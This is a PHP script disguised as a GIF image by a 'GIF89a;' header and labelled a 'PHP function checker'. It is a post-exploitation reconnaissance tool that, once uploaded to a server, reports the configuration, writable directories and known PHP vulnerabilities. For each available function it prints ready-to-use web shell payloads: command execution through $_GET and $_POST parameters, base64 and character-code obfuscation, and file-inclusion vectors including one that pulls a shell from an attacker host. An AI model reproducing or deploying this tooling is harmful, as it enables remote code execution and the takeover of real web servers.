GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
function cl($c){ return class_exists($c); }
$o = '';

// ============================================================
$o .= "============================================================\n";
$o .= "  PHP FUNCTION CHECKER v3.0 - PART 1/6\n";
$o .= "  Server Info + Command Exec + PHP Code Exec\n";
$o .= "============================================================\n\n";

// --- SERVER INFO ---
$o .= "====== SERVER INFO ======\n";
$o .= "Server: " . php_uname() . "\n";
$o .= "PHP Version: " . phpversion() . "\n";
$o .= "SAPI: " . php_sapi_name() . "\n";
$o .= "User: " . get_current_user() . "\n";
$o .= "CWD: " . getcwd() . "\n";
$o .= "PID: " . getmypid() . "\n";
$o .= "UID: " . getmyuid() . "\n";
$o .= "Doc Root: " . @$_SERVER['DOCUMENT_ROOT'] . "\n";
$o .= "Script: " . @$_SERVER['SCRIPT_FILENAME'] . "\n";
$o .= "Disabled: " . ini_get('disable_functions') . "\n";
$o .= "open_basedir: " . (ini_get('open_basedir') ? ini_get('open_basedir') : 'NONE') . "\n";
$o .= "allow_url_fopen: " . ini_get('allow_url_fopen') . "\n";
$o .= "allow_url_include: " . ini_get('allow_url_include') . "\n";
$o .= "display_errors: " . ini_get('display_errors') . "\n";
$o .= "file_uploads: " . ini_get('file_uploads') . "\n";
$o .= "upload_max_filesize: " . ini_get('upload_max_filesize') . "\n";
$o .= "post_max_size: " . ini_get('post_max_size') . "\n";
$o .= "max_execution_time: " . ini_get('max_execution_time') . "\n";
$o .= "memory_limit: " . ini_get('memory_limit') . "\n";
$o .= "expose_php: " . ini_get('expose_php') . "\n";
$o .= "session.save_path: " . ini_get('session.save_path') . "\n";
$o .= "upload_tmp_dir: " . ini_get('upload_tmp_dir') . "\n";
$o .= "error_log: " . ini_get('error_log') . "\n";
$o .= "sendmail_path: " . ini_get('sendmail_path') . "\n";
if (function_exists('disk_free_space')) {
    $o .= "Disk Free: " . round(@disk_free_space('/')/1024/1024) . " MB\n";
}

// --- LOADED EXTENSIONS ---
$o .= "\n--- LOADED EXTENSIONS ---\n";
if (function_exists('get_loaded_extensions')) {
    $exts = get_loaded_extensions();
    $o .= implode(', ', $exts) . "\n";
    $o .= "Total: " . count($exts) . " extensions\n";
}

// --- WRITABLE DIRS ---
$o .= "\n--- WRITABLE DIRS ---\n";
foreach (array('.','..','../../','/tmp','/var/tmp','/dev/shm','/var/www/html') as $p) {
    $o .= $p . ": " . (@is_writable($p) ? "[+] WRITABLE" : "[-] no") . "\n";
}

// --- PHP VERSION VULNS ---
$o .= "\n--- PHP VERSION ANALYSIS ---\n";
$ver = phpversion();
$parts = explode('.', $ver);
$major = (int)$parts[0];
$minor = (int)$parts[1];
$patch = isset($parts[2]) ? (int)$parts[2] : 0;
if ($major < 7) {
    $o .= "[!] PHP 5.x - assert() works like eval(), preg_replace /e available\n";
    $o .= "[!] PHP 5.x - Many known memory corruption exploits\n";
}
if ($major == 7 && $minor == 0) {
    $o .= "[!] PHP 7.0 - preg_replace /e still partially works\n";
}
if ($major == 7 && $minor <= 4 && $patch <= 3) {
    $o .= "[!] PHP 7.0-7.4.3 - debug_backtrace() UAF exploit available\n";
}
if ($major == 7 && $minor >= 4) {
    $o .= "[*] PHP 7.4+ - FFI available if ffi.enable=true\n";
}
if ($major == 8 && $minor == 1 && strpos($ver, 'dev') !== false) {
    $o .= "[!!!] PHP 8.1.0-dev - BACKDOOR! User-Agentt header RCE!\n";
}

// ============================================================
$o .= "\n====== 1. Command Execution (OS Shell) [CRITICAL] ======\n";
$o .= "Direct OS command execution - instant RCE if any available\n\n";
$cmds = array(
    'system' => array(
        "system('id');",
        "system(\$_GET['c']);",
        'Executes command and outputs result directly to browser'
    ),
    'exec' => array(
        "exec('id',\$output); print_r(\$output);",
        "exec(\$_GET['c'],\$o); echo implode(\"\\n\",\$o);",
        'Returns last line only, pass array for full output'
    ),
    'shell_exec' => array(
        "echo shell_exec('id');",
        "echo shell_exec(\$_GET['c']);",
        'Returns all output as string, same as backticks'
    ),
    'passthru' => array(
        "passthru('id');",
        "passthru(\$_GET['c']);",
        'Passes raw binary output directly to browser'
    ),
    'popen' => array(
        "\$h=popen('id','r'); echo fread(\$h,4096); pclose(\$h);",
        "\$h=popen(\$_GET['c'],'r'); while(!feof(\$h))echo fread(\$h,4096); pclose(\$h);",
        'Opens read/write pipe to process'
    ),
    'proc_open' => array(
        "\$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];\n           \$p=proc_open('id',\$d,\$pipes); echo stream_get_contents(\$pipes[1]);",
        "\$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];\n           \$p=proc_open(\$_GET['c'],\$d,\$pipes); echo stream_get_contents(\$pipes[1]);",
        'Full control: stdin/stdout/stderr pipes'
    ),
    'pcntl_exec' => array(
        "pcntl_exec('/bin/bash',['-c','id > /tmp/o.txt']);",
        "pcntl_exec('/bin/bash',['-c',\$_GET['c'].' > /tmp/o.txt']); echo file_get_contents('/tmp/o.txt');",
        'Replaces current process, needs pcntl module'
    ),
);
foreach ($cmds as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           Desc: {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        $o .= "           Shell: {$info[1]}\n";
    }
    $o .= "\n";
}
// Backtick check
$bt = ok('shell_exec') ? "[+] AVAILABLE" : "[-] blocked";
$o .= "  $bt  Backtick operator (\`cmd\`)\n";
$o .= "           Desc: Identical to shell_exec(), may bypass some WAFs\n";
if (ok('shell_exec')) $o .= "           Quick: echo \`id\`;\n";

// ============================================================
$o .= "\n====== 2. PHP Code Execution [CRITICAL] ======\n";
$o .= "Execute arbitrary PHP code internally\n\n";

// eval
$eval_ok = !in_array('eval', $d);
$o .= "  " . ($eval_ok ? "[+] AVAILABLE" : "[-] blocked") . "  eval\n";
$o .= "           Desc: Language construct - cannot truly be disabled via disable_functions\n";
if ($eval_ok) {
    $o .= "           Quick: eval('echo shell_exec(\"id\");');\n";
    $o .= "           Shell: eval(\$_POST['c']);\n";
    $o .= "           Obfuscated: eval(base64_decode('c3lzdGVtKCdpZCcpOw=='));\n";
}
$o .= "\n";

$code = array(
    'assert' => array(
        "assert('system(\"id\")');",
        "assert(\$_GET['c']);",
        "assert(base64_decode('c3lzdGVtKCdpZCcpOw=='));",
        'Acts like eval() in PHP < 7.2, changed behavior after'
    ),
    'create_function' => array(
        "\$f=create_function('','system(\"id\");'); \$f();",
        "\$f=create_function('',\$_GET['c']); \$f();",
        "",
        'Deprecated - creates anonymous function using eval internally'
    ),
    'preg_replace' => array(
        "preg_replace('/.*/e','system(\"id\")','x');",
        "preg_replace('/.*/e',\$_GET['c'],'x');",
        "",
        '/e modifier does eval() on match - REMOVED in PHP 7.0'
    ),
    'mb_ereg_replace' => array(
        "mb_ereg_replace('.*','system(\"id\")','x','e');",
        "mb_ereg_replace('.*',\$_GET['c'],'x','e');",
        "",
        'Multibyte regex with eval flag - needs mbstring'
    ),
);
foreach ($code as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           Desc: {$info[3]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        if ($info[1]) $o .= "           Shell: {$info[1]}\n";
        if ($info[2]) $o .= "           Obfuscated: {$info[2]}\n";
    }
    $o .= "\n";
}

$o .= "  [+] AVAILABLE  include / include_once / require / require_once\n";
$o .= "           Desc: Language constructs - always available, LFI/RFI vectors\n";
$o .= "           LFI: include('php://filter/convert.base64-encode/resource=config.php');\n";
$o .= "           RFI: include('http://attacker/shell.txt');  // needs allow_url_include\n";
$o .= "           Input: include('php://input');  // POST body as PHP code\n";
$o .= "           Data: include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==');\n";
$o .= "           Log: include('/var/log/apache2/access.log');  // after log poisoning\n";
$o .= "           Phar: include('phar://uploaded.phar/shell');\n";
$o .= "           Zip: include('zip://uploaded.zip#shell.php');\n";
$o .= "\n";

// Dynamic calls
$o .= "  [+] AVAILABLE  Dynamic function calls\n";
$o .= "           Desc: PHP allows calling any function by name stored in variable\n";
$o .= "           Variable: \$_GET['f'](\$_GET['a']);  // ?f=system&a=id\n";
$o .= "           Concat: ('sys'.'tem')('id');\n";
$o .= "           Chr: \$f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); \$f('id');\n";
$o .= "           Octal: \"\\163\\171\\163\\164\\145\\155\"('id');\n";
$o .= "           Hex: \"\\x73\\x79\\x73\\x74\\x65\\x6d\"('id');\n";
$o .= "           Curly: \${\"\\x73ystem\"}('id');  // in double-quoted strings\n";

file_put_contents('/tmp/_audit_p1.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 1/6 saved to /tmp/_audit_p1.txt\n";
?>
